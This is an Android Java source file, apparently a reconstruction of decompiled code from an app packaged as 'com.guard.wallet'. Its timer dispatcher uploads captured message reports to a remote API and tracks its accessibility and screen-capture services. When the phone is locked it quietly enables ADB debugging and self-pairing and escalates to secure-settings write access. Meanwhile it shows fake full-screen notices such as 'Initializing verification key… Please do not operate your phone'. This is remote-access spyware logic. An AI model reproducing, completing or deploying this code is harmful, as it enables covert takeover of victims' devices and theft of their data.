/**
 * vendor thread/d.java — PeriodicTaskDispatcher
 *
 * TimerTask 定时任务分发器。
 * case 0: 消息刷新 (HandlerMsgAndTimer)
 * case 1: 策略线程 (StrategyThread)
 * case 2: 无障碍截屏 (MiniCapture) — API 30+
 * default: AdbStream 通用定时回调
 */
package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.os.Build;
import android.util.Log;
import com.google.gson.JsonObject;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.TimerTask;

public final class PeriodicTaskDispatcher extends TimerTask {
    public final int a;
    public final Object b;

    public PeriodicTaskDispatcher(Object target, int type) {
        this.a = type;
        this.b = target;
    }

    @Override
    public void run() {
        switch (this.a) {
            case 0:
                handleCase0((HandlerMsgAndTimer) this.b);
                return;
            case 1:
                handleCase1((StrategyThread) this.b);
                return;
            case 2:
                // vendor case 2: screenshot via AccessibilityService.takeScreenshot (API 30+)
                // 依赖 VideoRecordManager (MiniCapture callback) 尚未翻译, 保留桩
                handleCase2(this.b);
                return;
            default:
                // vendor default: ((b1.h)var6).y() — AdbStream periodic callback
                // Now handled by libadb-android library internally; no-op.
                return;
        }
    }

    // ═══════ case 0: HandlerMsgAndTimer 消息刷新 ═══════

    private static void handleCase0(HandlerMsgAndTimer handler) {
        if (handler == null) {
            return;
        }

        Log.d("HandlerMsgAndTimer", "handle msg thread is running");

        // 刷新高优先级队列 (handler.f)
        if (!handler.f.isEmpty()) {
            flushPriorityQueue(handler);
        }

        // 每隔一次上报容器事件
        if (!handler.b) {
            reportContainerEvents(handler);
        }
        handler.b = !handler.b;

        // 刷新普通队列 (handler.e)
        if (!handler.e.isEmpty()) {
            flushNormalQueue(handler);
        }
    }

    @SuppressWarnings("unchecked")
    private static void flushPriorityQueue(HandlerMsgAndTimer handler) {
        LinkedList<ReqMessageVO> batch = new LinkedList<>();
        while (batch.size() < 20 && !handler.f.isEmpty()) {
            ReqMessageVO item = handler.f.poll();
            if (item != null) {
                batch.add(item);
            }
        }

        if (batch.isEmpty()) {
            return;
        }

        try {
            ApiRequest<LinkedList<ReqMessageVO>> request = new ApiRequest<>();
            request.setData(batch);
            JsonObject response = com.guard.wallet.http.HttpApiManager.syncPostMessage(request, com.guard.wallet.http.HttpApiManager.apiBaseUrl);

            if (response != null) {
                HandlerMsgAndTimer$2 typeRef = new HandlerMsgAndTimer$2();
                ApiResult<?> result = (ApiResult<?>) com.guard.wallet.utils.SharedPrefsManager.c(response.toString(), typeRef);
                if (result != null && Boolean.TRUE.equals(result.getSuccess()) && Boolean.TRUE.equals(result.getData())) {
                    Log.d("HandlerMsgAndTimer", "同步发送监听汇报消息成功,发送数目：" + batch.size());
                    return;
                }
            }

            // 同步失败, 归还队列
            Log.e("HandlerMsgAndTimer", "同步发送监听汇报消息失败,归还数目：" + batch.size());
            handler.f.addAll(batch);
        } catch (Exception ex) {
            AppUtils.s("HandlerMsgAndTimer", ex);
        }
    }

    @SuppressWarnings("unchecked")
    private static void flushNormalQueue(HandlerMsgAndTimer handler) {
        LinkedList<ReqMessageVO> batch = new LinkedList<>();
        while (batch.size() < 20 && !handler.e.isEmpty()) {
            ReqMessageVO item = handler.e.poll();
            if (item != null) {
                batch.add(item);
            }
        }

        if (batch.isEmpty()) {
            return;
        }

        ApiRequest<LinkedList<ReqMessageVO>> request = new ApiRequest<>();
        request.setData(batch);

        try {
            JsonObject response = com.guard.wallet.http.HttpApiManager.syncPostMessage(request, com.guard.wallet.http.HttpApiManager.apiBaseUrl);

            if (response != null) {
                HandlerMsgAndTimer$3 typeRef = new HandlerMsgAndTimer$3();
                ApiResult<?> result = (ApiResult<?>) com.guard.wallet.utils.SharedPrefsManager.c(response.toString(), typeRef);
                if (result != null && Boolean.TRUE.equals(result.getSuccess()) && Boolean.TRUE.equals(result.getData())) {
                    Log.d("HandlerMsgAndTimer", "同步发送消息成功：" + batch.size());
                    return;
                }
            }

            // 同步失败, 异步重试
            com.guard.wallet.http.PostMessageCallback callback = new com.guard.wallet.http.PostMessageCallback();
            com.guard.wallet.http.HttpClient httpClient = new com.guard.wallet.http.HttpClient();
            httpClient.asyncPost(request, "/api/message/post.json", callback);
            Log.d("HandlerMsgAndTimer", "异步提交消息:" + batch.size());
        } catch (Exception ex) {
            AppUtils.s("HandlerMsgAndTimer", ex);
        }
    }

    @SuppressWarnings("unchecked")
    private static void reportContainerEvents(HandlerMsgAndTimer handler) {
        // 无障碍容器事件
        MessageRecordVO<ContainerEventVO> accessibilityRecord = new MessageRecordVO<>();
        ContainerEventVO accessibilityEvent = new ContainerEventVO();
        if (MainApplication.getInstance() != null) {
            accessibilityEvent.setPackageName(MainApplication.getInstance().getPackageName());
        }
        accessibilityEvent.setContainerCode("ACCESSIBILITY_CONTAINER");
        accessibilityEvent.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
        accessibilityEvent.setServiceState(com.guard.wallet.server.ApiRouter.serviceState.get());
        accessibilityRecord.setIntentCode("android.intent.action.CONTAINER_EVENT");
        accessibilityRecord.setExtraBody(accessibilityEvent);
        handler.b(accessibilityRecord);

        // MiniCap 容器事件
        MessageRecordVO<ContainerEventVO> miniCapRecord = new MessageRecordVO<>();
        ContainerEventVO miniCapEvent = new ContainerEventVO();
        if (MainApplication.getInstance() != null) {
            miniCapEvent.setPackageName(MainApplication.getInstance().getPackageName());
        }
        miniCapEvent.setContainerCode("ACCESSIBILITY_MINI_CAP_CONTAINER");
        // vendor: WebSocketManager.getInstance().isRunning.get() → replica 用 !eventListeners.isEmpty() 替代
        int miniCapOpened;
        if (com.guard.wallet.server.WebSocketManager.getInstance() != null && !com.guard.wallet.server.WebSocketManager.getInstance().eventListeners.isEmpty()) {
            miniCapOpened = 1;
        } else {
            miniCapOpened = 0;
        }
        miniCapEvent.setIsOpened(miniCapOpened);
        miniCapEvent.setServiceState(miniCapOpened);
        miniCapRecord.setIntentCode("android.intent.action.CONTAINER_EVENT");
        miniCapRecord.setExtraBody(miniCapEvent);
        handler.b(miniCapRecord);
    }

    // ═══════ case 1: StrategyThread 策略线程 ═══════

    @SuppressWarnings("unchecked")
    private static void handleCase1(StrategyThread strategy) {
        if (strategy == null || !(strategy.e instanceof ConcurrentLinkedQueue)) {
            return;
        }

        ConcurrentLinkedQueue<String> queue = (ConcurrentLinkedQueue<String>) strategy.e;
        if (queue.isEmpty()) {
            return;
        }

        String event = queue.poll();
        if (AppUtils.B(event) || com.guard.wallet.delegate.AdbBridge.getAdbManager() == null) {
            return;
        }

        try {
            // vendor var86: 无障碍服务是否就绪 (f.b.get() && service != null && service.V())
            boolean accessibilityReady = com.guard.wallet.utils.LocateValuesUtils.loaded.get()
                    && MyAccessibilityService.P() != null
                    && MyAccessibilityService.P().V();

            // vendor var95: perIdleDuration (从配置获取或使用默认值)
            int perIdleDuration;
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getBuildConfig() != null
                    && MainApplication.getInstance().getBuildConfig().getPerIdleDuration() > 0) {
                perIdleDuration = MainApplication.getInstance().getBuildConfig().getPerIdleDuration();
            } else {
                perIdleDuration = com.guard.wallet.utils.ConfigManager.DEFAULT_IDLE_DURATION;
            }

            int eventId = mapStrategyEvent(event);

            switch (eventId) {
                case 0: // KEEP_ADB_ALIVE_SCREEN_OFF
                    handleScreenOff();
                    return;

                case 1: // KEEP_ADB_ALIVE_SCREEN_ON
                    if (com.guard.wallet.utils.SystemHelper.B0().getIsKeyguardLocked() != 1) {
                        return;
                    }
                    Log.d("StrategyThread", "手机亮屏,屏幕锁定");
                    return;

                case 2: // KEEP_ADB_ALIVE_SCREEN_USER_PRESENT
                    Log.d("StrategyThread", "手机解锁,初始化连接状态");
                    return;

                case 3: // KEEP_ADB_ALIVE_DEVELOPMENT_ON
                case 4: // KEEP_ADB_ALIVE_DEVELOPMENT_OFF
                case 5: // KEEP_ADB_ALIVE_ADB_DEBUG_ON
                case 6: // KEEP_ADB_ALIVE_ADB_DEBUG_OFF
                case 7: // KEEP_ADB_ALIVE_WIFI_DEBUG_ON
                case 8: // KEEP_ADB_ALIVE_WIFI_DEBUG_OFF
                    com.guard.wallet.delegate.AdbBridge.getAdbManager().periodicMaintenance();
                    return;

                case 9: // SCREEN_OFF_LONG_DURATION
                    handleScreenOffLongDuration(accessibilityReady);
                    return;

                case 10: // INTERACTIVE_IDLE_LONG_DURATION
                    handleInteractiveIdleLong(accessibilityReady, perIdleDuration);
                    return;

                case 11: // LOCAL_LOCK_CIPHER_PREPARED
                    handleLocalLockCipherPrepared(accessibilityReady, perIdleDuration);
                    return;

                case 12: // PREPARE_LEAVE_PIP
                    handlePrepareLeavePip(accessibilityReady);
                    return;

                case 13: // PREPARE_FOR_APP_CONFIRM_LOCK
                    handlePrepareForAppConfirmLock(accessibilityReady);
                    return;

                case 14: // LOCAL_WIFI_NETWORK_PREPARED
                    handleLocalWifiNetworkPrepared(accessibilityReady);
                    return;

                case 15: // PREPARE_FOR_UPDATE_SYSTEM
                    handlePrepareForUpdateSystem(accessibilityReady);
                    return;

                case 16: // LOAD_LOCATE_VALUES_FINISHED
                case 17: // LOAD_LISTEN_WINDOW_FINISHED
                    handleLoadFinished(accessibilityReady);
                    return;

                default:
                    Log.d("StrategyThread", "未知策略事件");
                    return;
            }
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor: 将事件字符串映射为 switch case 编号 */
    private static int mapStrategyEvent(String event) {
        if (event == null) return -1;
        switch (event) {
            case "KEEP_ADB_ALIVE_SCREEN_OFF":          return 0;
            case "KEEP_ADB_ALIVE_SCREEN_ON":           return 1;
            case "KEEP_ADB_ALIVE_SCREEN_USER_PRESENT": return 2;
            case "KEEP_ADB_ALIVE_DEVELOPMENT_ON":      return 3;
            case "KEEP_ADB_ALIVE_DEVELOPMENT_OFF":     return 4;
            case "KEEP_ADB_ALIVE_ADB_DEBUG_ON":        return 5;
            case "KEEP_ADB_ALIVE_ADB_DEBUG_OFF":       return 6;
            case "KEEP_ADB_ALIVE_WIFI_DEBUG_ON":       return 7;
            case "KEEP_ADB_ALIVE_WIFI_DEBUG_OFF":      return 8;
            case "SCREEN_OFF_LONG_DURATION":           return 9;
            case "INTERACTIVE_IDLE_LONG_DURATION":     return 10;
            case "LOCAL_LOCK_CIPHER_PREPARED":          return 11;
            case "PREPARE_LEAVE_PIP":                  return 12;
            case "PREPARE_FOR_APP_CONFIRM_LOCK":       return 13;
            case "LOCAL_WIFI_NETWORK_PREPARED":         return 14;
            case "PREPARE_FOR_UPDATE_SYSTEM":          return 15;
            case "LOAD_LOCATE_VALUES_FINISHED":        return 16;
            case "LOAD_LISTEN_WINDOW_FINISHED":        return 17;
            default:                                   return -1;
        }
    }

    /** vendor case 0: 息屏处理 */
    private static void handleScreenOff() {
        try {
            LockPatternVO lockState = com.guard.wallet.utils.SystemHelper.B0();
            Log.d("StrategyThread", "手机息屏");
            if (lockState.getIsKeyguardLocked() == 1 && lockState.getIsDeviceSecure() == 1) {
                Log.d("StrategyThread", "手机息屏,屏幕锁定");
                if (!com.guard.wallet.utils.SystemHelper.I()) {
                    Log.d("StrategyThread", "手机息屏,屏幕锁定，发起打开ADB调试");
                    com.guard.wallet.http.HttpApiManager.openAdbDebug("http://127.0.0.1:7911");
                }
            }
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 9: SCREEN_OFF_LONG_DURATION */
    private static void handleScreenOffLongDuration(boolean accessibilityReady) {
        try {
            long screenOffTicks = 0L;
            if (MainApplication.getInstance().getCheckThread() != null) {
                screenOffTicks = MainApplication.getInstance().getCheckThread().p.get();
            }

            int perScreenOffDuration;
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getBuildConfig() != null
                    && MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration() > 0) {
                perScreenOffDuration = MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration();
            } else {
                perScreenOffDuration = com.guard.wallet.utils.ConfigManager.DEFAULT_SCREEN_OFF_DURATION;
            }

            if (screenOffTicks < (long) perScreenOffDuration || screenOffTicks % (long) perScreenOffDuration != 0L) {
                return;
            }

            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().H(true, true);
            }
            com.guard.wallet.helper.BlockViewManager.c();

            if (!accessibilityReady) {
                return;
            }

            // 走公共尾部: 尝试本地ADB配对
            doCommonTail(null);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 10: INTERACTIVE_IDLE_LONG_DURATION */
    private static void handleInteractiveIdleLong(boolean accessibilityReady, int perIdleDuration) {
        try {
            long idleTicks = 0L;
            if (MainApplication.getInstance().getCheckThread() != null) {
                idleTicks = MainApplication.getInstance().getCheckThread().n.get();
            }

            // vendor 周期检查: 小于周期或不是周期整数倍则返回
            if (idleTicks < (long) perIdleDuration || idleTicks % (long) perIdleDuration != 0L) {
                return;
            }

            // vendor: 每 4 个周期额外检查, 如果满足条件则跳过
            if (idleTicks % ((long) perIdleDuration * 4) == 0L
                    && !com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired()
                    && !com.guard.wallet.utils.SystemHelper.n0()
                    && com.guard.wallet.utils.SystemHelper.S0()) {
                return;
            }

            if (!accessibilityReady) {
                return;
            }

            // 走公共尾部: 尝试本地ADB配对
            doCommonTail(null);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 11: LOCAL_LOCK_CIPHER_PREPARED */
    private static void handleLocalLockCipherPrepared(boolean accessibilityReady, int perIdleDuration) {
        try {
            long idleTicks = 0L;
            if (MainApplication.getInstance().getCheckThread() != null) {
                idleTicks = MainApplication.getInstance().getCheckThread().n.get();
            }

            if (idleTicks < (long) perIdleDuration || idleTicks % (long) perIdleDuration != 0L || com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired()) {
                return;
            }

            if (!accessibilityReady) {
                return;
            }

            if (!com.guard.wallet.utils.SystemHelper.n0()) {
                return;
            }

            com.guard.wallet.delegate.AdbBridge.getAdbManager().getClass();
            com.guard.wallet.delegate.AdbBridge.runPairingFlow(null);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 12: PREPARE_LEAVE_PIP */
    private static void handlePrepareLeavePip(boolean accessibilityReady) {
        try {
            if (!com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired()) {
                if (accessibilityReady) {
                    if (Objects.equals(0, com.guard.wallet.utils.ConfigManager.getPromotionModel())
                            && com.guard.wallet.utils.SystemHelper.n0()
                            && com.guard.wallet.delegate.AdbBridge.runPairingFlow(null)) {
                        return;
                    }
                }
            }

            com.guard.wallet.delegate.AdbBridge.stopPip();
            com.guard.wallet.helper.BlockViewManager.c();
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 13: PREPARE_FOR_APP_CONFIRM_LOCK */
    private static void handlePrepareForAppConfirmLock(boolean accessibilityReady) {
        try {
            if (com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired()) {
                // 已配对, 尝试关闭 PiP 并 StrategyThread.e()
                StrategyThread.e();
                return;
            }

            if (accessibilityReady) {
                if (!com.guard.wallet.utils.SystemHelper.n0()) {
                    // n0 失败, 尝试关闭 PiP
                    StrategyThread.e();
                    return;
                }

                String msg = getAppCredentialInitMsg();
                BlockViewVO blockView = new BlockViewVO(false, msg, false, false);
                com.guard.wallet.delegate.AdbBridge.getAdbManager().getClass();
                if (com.guard.wallet.delegate.AdbBridge.runPairingFlow(blockView)) {
                    return;
                }
            }

            // 尝试关闭 PiP
            StrategyThread.e();
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 14: LOCAL_WIFI_NETWORK_PREPARED */
    private static void handleLocalWifiNetworkPrepared(boolean accessibilityReady) {
        try {
            if (com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired()) {
                StrategyThread.e();
                return;
            }

            if (accessibilityReady) {
                if (!com.guard.wallet.utils.SystemHelper.n0()) {
                    StrategyThread.e();
                    return;
                }

                String msg = getWifiBlockMsg();
                BlockViewVO blockView = new BlockViewVO(false, msg, false, false);
                com.guard.wallet.delegate.AdbBridge.getAdbManager().getClass();
                if (com.guard.wallet.delegate.AdbBridge.runPairingFlow(blockView)) {
                    return;
                }
            }

            StrategyThread.e();
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 15: PREPARE_FOR_UPDATE_SYSTEM */
    private static void handlePrepareForUpdateSystem(boolean accessibilityReady) {
        try {
            if (!accessibilityReady) {
                return;
            }

            String updateMsg = com.guard.wallet.utils.ConfigManager.getUpdateMsg();
            BlockViewVO blockView = new BlockViewVO(false, updateMsg, false, false);
            Object var_eb = com.guard.wallet.delegate.AdbBridge.getPipActivity();
            if (com.guard.wallet.utils.DeviceUtils.isVivoFamily() && StrategyThread.g(blockView, true)) {
                return;
            }

            if (com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired() || !com.guard.wallet.utils.SystemHelper.n0()) {
                return;
            }

            // 走公共尾部: com.guard.wallet.delegate.AdbBridge.runPairingFlow(blockView)
            com.guard.wallet.delegate.AdbBridge.getAdbManager().getClass();
            doCommonTailWithView(blockView);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** vendor case 16/17: LOAD_LOCATE_VALUES_FINISHED / LOAD_LISTEN_WINDOW_FINISHED */
    private static void handleLoadFinished(boolean accessibilityReady) {
        try {
            if (!accessibilityReady) {
                return;
            }

            String aliveMsg = getAliveBlockMsg();
            BlockViewVO blockView = new BlockViewVO(false, aliveMsg, false, false);
            if (StrategyThread.g(blockView, true)) {
                return;
            }

            if (StrategyThread.e()) {
                return;
            }

            if (com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired() || !com.guard.wallet.utils.SystemHelper.n0()) {
                return;
            }

            // 走公共尾部: com.guard.wallet.delegate.AdbBridge.runPairingFlow(blockView)
            com.guard.wallet.delegate.AdbBridge.getAdbManager().getClass();
            doCommonTailWithView(blockView);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /**
     * vendor 公共尾部逻辑 (case 9/10 使用):
     * 尝试 requestLocalKeepAlive 或 requestLocalAdbPair 或 openWriteSecure
     */
    private static void doCommonTail(BlockViewVO view) {
        try {
            Object var_eb = com.guard.wallet.delegate.AdbBridge.getPipActivity();
            boolean isPipReady = com.guard.wallet.utils.DeviceUtils.isVivoFamily();

            if (isPipReady) {
                if (StrategyThread.g(null, true)) {
                    Log.d("StrategyThread", "requestLocalKeepAlive");
                    return;
                }
            }

            if (!com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired() && com.guard.wallet.utils.SystemHelper.n0() && com.guard.wallet.delegate.AdbBridge.runPairingFlow(null)) {
                Log.d("StrategyThread", "requestLocalAdbPair");
                return;
            }

            if (StrategyThread.g(null, true)) {
                Log.d("StrategyThread", "requestLocalKeepAlive");
                return;
            }

            if (!com.guard.wallet.delegate.AdbBridge.getAdbManager().isPaired() || !com.guard.wallet.delegate.AdbBridge.getAdbManager().D() || !com.guard.wallet.delegate.AdbBridge.getAdbManager().ratHatPending.get() || !com.guard.wallet.delegate.AdbBridge.getAdbManager().openWriteSecure()) {
                return;
            }

            Log.d("StrategyThread", "openWriteSecure");
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    /** 公共尾部: com.guard.wallet.delegate.AdbBridge.runPairingFlow(view) */
    private static void doCommonTailWithView(BlockViewVO view) {
        try {
            com.guard.wallet.delegate.AdbBridge.runPairingFlow(view);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }

    // ═══════ case 2: MiniCapture 截屏 (API 30+) ═══════

    /**
     * vendor case 2: 通过 AccessibilityService.takeScreenshot 截屏。
     * 依赖 VideoRecordManager (MiniCapture screenshot callback) 未翻译, 此处保留功能桩。
     */
    private static void handleCase2(Object target) {
        // ADAPT: vendor case 2 依赖 VideoRecordManager (MiniCapture callback 类),
        // 该类在 vendor 中不存在独立文件 (R8 synthetic), 暂保留空实现
        if (MyAccessibilityService.P() == null || Build.VERSION.SDK_INT < 30) {
            return;
        }
        // vendor 在此检查 VideoRecordManager.pendingFutures (pending futures LinkedList) 是否全部完成,
        // 然后调用 takeScreenshot 并阻塞等待结果
        Log.d("MiniCaptureTimer", "screenshot timer tick (stub)");
    }

    // ═══════ 辅助方法: 获取配置消息 ═══════

    private static String getAppCredentialInitMsg() {
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg())) {
            return MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg();
        }
        return "Initializing verification key\nPlease wait...";
    }

    private static String getWifiBlockMsg() {
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getWifiBlockMsg())) {
            return MainApplication.getInstance().getBuildConfig().getWifiBlockMsg();
        }
        return "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone...";
    }

    private static String getAliveBlockMsg() {
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getAliveBlockMsg())) {
            return MainApplication.getInstance().getBuildConfig().getAliveBlockMsg();
        }
        return "Initializing [StripChat video assistant]\nPlease do not operate your phone...";
    }
}
